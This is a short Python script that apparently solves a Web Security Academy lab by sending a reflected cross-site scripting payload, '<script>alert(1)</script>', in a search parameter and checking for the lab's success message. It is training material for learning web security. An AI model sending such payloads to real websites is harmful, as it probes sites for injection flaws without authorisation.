import requests

# Edit the URL
url = "https://0a4300950448eed8802a08f5001c0010.web-security-academy.net/?search="
payload = "<script>alert(1)</script>"

global r
r = requests.Session()

def exp():
    s = r.get(url + payload)
    if s.status_code == 200:
       if "Congratulations" in s.text:
           print("Lab solved!")

if __name__ == "__main__":
    exp()